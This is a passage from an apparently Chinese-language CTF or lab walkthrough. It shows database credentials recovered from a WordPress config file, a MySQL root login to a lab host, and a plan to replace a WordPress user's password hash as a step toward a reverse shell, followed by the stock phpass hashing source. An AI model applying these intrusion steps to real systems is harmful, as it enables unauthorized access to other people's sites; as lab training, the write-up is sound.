class="string">&#x27;[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&amp;_nP4&#123;D&#125;n=y=FQt%zJw&gt;c[a+;ppCzIkt;&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;tb(&#125;BfgB7l!rhDVm&#123;eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each a unique</span><br><span class="line"> * prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span>  = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy blogging. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( !defined(&#x27;</span>ABSPATH<span class="string">&#x27;) )</span></span><br><span class="line"><span class="string">        define(&#x27;</span>ABSPATH<span class="string">&#x27;, dirname(__FILE__) . &#x27;</span>/<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once(ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">define(&#x27;</span>WP_HTTP_BLOCK_EXTERNAL<span class="string">&#x27;, true);</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>得数据库密码 root/plbkac</p>
<h2 id="wordpress-反弹-shell">8. WordPress 反弹 Shell</h2>
<p>phpmyadmin 直接登录，可以在 wordpress 找到用户信息，不过密码是
hash</p>
<p>也可直接命令行操作</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># mysql -h 10.0.3.35 -uroot -pplbkac --ssl=false</span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 16</span><br><span class="line">Server version: 5.7.12-0ubuntu1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Support MariaDB developers by giving a star at https://github.com/MariaDB/server</span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| loot               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| phpmyadmin         |</span><br><span class="line">| proof              |</span><br><span class="line">| sys                |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">8 rows <span class="keyword">in</span> <span class="built_in">set</span> (1.029 sec)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注，截至目前已经拿到了 MySQL 的 root 密码，可直接尝试利用 MySQL 上传
Shell，不过由于不知道绝对路径需要去猜……上传示例可详见参考文章</p>
</blockquote>
<p>分析前面 SMB 找到的 wordpress 源码可知，用户密码所用 Hash
函数如下，故可利用该函数生成个用户密码的 Hash 替换【<a
target="_blank" rel="noopener" href="https://www.jyshare.com/compile/1/">PHP 在线工具 |
菜鸟工具</a>】</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Portable PHP password hashing framework.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> phpass</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 0.3 / WordPress</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> http://www.openwall.com/phpass/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Written by Solar Designer &lt;solar at openwall.com&gt; in 2004-2006 and placed in</span></span><br><span class="line"><span class="comment"># the public domain.  Revised in subsequent years, still public domain.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># There&#x27;s absolutely no warranty.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Please be sure to update the Version line if you edit this file in any way.</span></span><br><span class="line"><span class="comment"># It is suggested that you leave the main version number intact, but indicate</span></span><br><span class="line"><span class="comment"># your project name (after the slash) and add your own revision information.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Please do not change the &quot;private&quot; password hashing method implemented in</span></span><br><span class="line"><span class="comment"># here, thereby making your hashes incompatible.  However, if you must, please</span></span><br><span class="line"><span class="comment"># change the hash type identifier (the &quot;$P$&quot;) to something different.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Obviously, since this code is in the public domain, the above are not</span></span><br><span class="line"><span class="comment"># requirements (there can be none), but merely suggestions.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Portable PHP password hashing framework.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> phpass</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 0.3 / WordPress</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> http://www.openwall.com/phpass/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordHash</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$itoa64</span>;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$iteration_count_log2</span>;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$portable_hashes</span>;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$random_state</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">PasswordHash</span>(<span class="params"><span class="variable">$iteration_count_log2</span>, <span class="variable">$portable_hashes</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;itoa64 = <span class="string">&#x27;./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$iteration_count_log2</span> &lt; <span class="number">4</span> || <span class="variable">$iteration_count_log2</span> &gt; <span class="number">31</span>)</span><br><span class="line">			<span class="variable">$iteration_count_log2</span> = <span class="number">8</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;iteration_count_log2 = <span class="variable">$iteration_count_log2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;portable_hashes = <span class="variable">$portable_hashes</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;random_state = <span class="title function_ invoke__">microtime</span>() . <span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">rand</span>(), <span class="literal">TRUE</span>); <span class="comment">// removed getmypid() for compatibility reasons</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_random_bytes</span>(<span class="params"><span class="variable">$count</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> ( @<span class="title function_ invoke__">is_readable</span>(<span class="string">&#x27;/dev/urandom&#x27;</span>) &amp;&amp;</span><br><span class="line">		    (<span class="variable">$fh</span> = @<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;/dev/urandom&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))) &#123;</span><br><span class="line">			<span class="variable">$output</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="variable">$count</span>);</span><br><span class="line">			<span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$output</span>) &lt; <span class="variable">$count</span>) &#123;</span><br><span class="line">			<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span> += <span class="number">16</span>) &#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;random_state =</span><br><span class="line">				    <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">microtime</span>() . <span class="variable">$this</span>-&gt;random_state);</span><br><span class="line">				<span class="variable">$output</span> .=</span><br><span class="line">				    <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;H*&#x27;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;random_state));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$output</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$output</span>, <span class="number">0</span>, <span class="variable">$count</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encode64</span>(<span class="params"><span class="variable">$input</span>, <span class="variable">$count</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$input</span>[<span class="variable">$i</span>++]);</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;itoa64[<span class="variable">$value</span> &amp; <span class="number">0x3f</span>];</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="variable">$count</span>)</span><br><span class="line">				<span class="variable">$value</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$input</span>[<span class="variable">$i</span>]) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;itoa64[(<span class="variable">$value</span> &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>];</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$i</span>++ &gt;= <span class="variable">$count</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="variable">$count</span>)</span><br><span class="line">				<span class="variable">$value</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$input</span>[<span class="variable">$i</span>]) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;itoa64[(<span class="variable">$value</span> &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>];</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$i</span>++ &gt;= <span class="variable">$count</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;itoa64[(<span class="variable">$value</span> &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>];</span><br><span class="line">		&#125; <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$count</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">gensalt_private</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;$P$&#x27;</span>;</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;itoa64[<span class="title function_ invoke__">min</span>(<span class="variable">$this</span>-&gt;iteration_count_log2 +</span><br><span class="line">			((PHP_VERSION &gt;= <span class="string">&#x27;5&#x27;</span>) ? <span class="number">5</span> : <span class="number">3</span>), <span class="number">30</span>)];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encode64</span>(<span class="variable">$input</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">crypt_private</span>(<span class="params"><span class="variable">$password</span>, <span class="variable">$setting</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;*0&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$setting</span>, <span class="number">0</span>, <span class="number">2</span>) == <span class="variable">$output</span>)</span><br><span class="line">			<span class="variable">$output</span> = <span class="string">&#x27;*1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$id</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$setting</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">		<span class="comment"># We use &quot;$P$&quot;, phpBB3 uses &quot;$H$&quot; for the same thing</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$id</span> != <span class="string">&#x27;$P$&#x27;</span> &amp;&amp; <span class="variable">$id</span> != <span class="string">&#x27;$H$&#x27;</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$count_log2</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;itoa64, <span class="variable">$setting</span>[<span class="number">3</span>]);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$count_log2</span> &lt; <span class="number">7</span> || <span class="variable">$count_log2</span> &gt; <span class="number">30</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$count</span> = <span class="number">1</span> &lt;&lt; <span class="variable">$count_log2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$salt</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$setting</span>, <span class="number">4</span>, <span class="number">8</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$salt</span>) != <span class="number">8</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment"># We&#x27;re kind of forced to use MD5 here since it&#x27;s the only</span></span><br><span class="line">		<span class="comment"># cryptographic primitive available in all versions of PHP</span></span><br><span class="line">		<span class="comment"># currently in use.  To implement our own low-level crypto</span></span><br><span class="line">		<span class="comment"># in PHP would result in much worse performance and</span></span><br><span class="line">		<span class="comment"># consequently in lower iteration counts and hashes that are</span></span><br><span class="line">		<span class="comment"># quicker to crack (by non-PHP code).</span></span><br><span class="line">		<span class="keyword">if</span> (PHP_VERSION &gt;= <span class="string">&#x27;5&#x27;</span>) &#123;</span><br><span class="line">			<span class="variable">$hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span> . <span class="variable">$password</span>, <span class="literal">TRUE</span>);</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="variable">$hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$hash</span> . <span class="variable">$password</span>, <span class="literal">TRUE</span>);</span><br><span class="line">			&#125; <span class="keyword">while</span> (--<span class="variable">$count</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$hash</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;H*&#x27;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span> . <span class="variable">$password</span>));</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="variable">$hash</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;H*&#x27;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$hash</span> . <span class="variable">$password</span>));</span><br><span class="line">			&#125; <span class="keyword">while</span> (--<span class="variable">$count</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$setting</span>, <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encode64</span>(<span class="variable">$hash</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">gensalt_extended</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$count_log2</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$this</span>-&gt;iteration_count_log2 + <span class="number">8</span>, <span class="number">24</span>);</span><br><span class="line">		<span class="comment"># This should be odd to not reveal weak DES keys, and the</span></span><br><span class="line">		<span class="comment"># maximum valid value is (2**24 - 1) which is odd anyway.</span></span><br><span class="line">		<span class="variable">$count</span> = (<span class="number">1</span> &lt;&lt; <span class="variable">$count_log2</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;itoa64[<span class="variable">$count</span> &amp; <span class="number">0x3f</span>];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;itoa64[(<span class="variable">$count</span> &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;itoa64[(<span class="variable">$count</span> &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;itoa64[(<span class="variable">$count</span> &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encode64</span>(<span class="variable">$input</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">gensalt_blowfish</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment"># This one needs to use a different order of characters and a</span></span><br><span class="line">		<span class="comment"># different encoding scheme from the one in encode64() above.</span></span><br><span class="line">		<span class="comment"># We care because the last character in our encoded string will</span></span><br><span class="line">		<span class="comment"># only represent 2 bits.  While two known implementations of</span></span><br><span class="line">		<span class="comment"># bcrypt will happily accept and correct a salt string which</span></span><br><span class="line">		<span class="comment"># has the 4 unused bits set to non-zero, we do not want to take</span></span><br><span class="line">		<span class="comment"># chances and we also do not want to waste an additional byte</span></span><br><span class="line">		<span class="comment"># of entropy.</span></span><br><span class="line">		<span class="variable">$itoa64</span> = <span class="string">&#x27;./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;$2a$&#x27;</span>;</span><br><span class="line">		<span class="variable">$output</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;0&#x27;</span>) + <span class="variable">$this</span>-&gt;iteration_count_log2 / <span class="number">10</span>);</span><br><span class="line">		<span class="variable">$output</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;0&#x27;</span>) + <span class="variable">$this</span>-&gt;iteration_count_log2 % <span class="number">10</span>);</span><br><span class="line">		<span class="variable">$output</span> .= <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="variable">$c1</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$input</span>[<span class="variable">$i</span>++]);</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable">$itoa64</span>[<span class="variable">$c1</span> &gt;&gt; <span class="number">2</span>];</span><br><span class="line">			<span class="variable">$c1</span> = (<span class="variable">$c1</span> &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$i</span> &gt;= <span class="number">16</span>) &#123;</span><br><span class="line">				<span class="variable">$output</span> .= <span class="variable">$itoa64</span>[<span class="variable">$c1</span>];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$c2</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$input</span>[<span class="variable">$i</span>++]);</span><br><span class="line">			<span class="variable">$c1</span> |= <span class="variable">$c2</span> &gt;&gt; <span class="number">4</span>;</span><br><span class="line">			<span 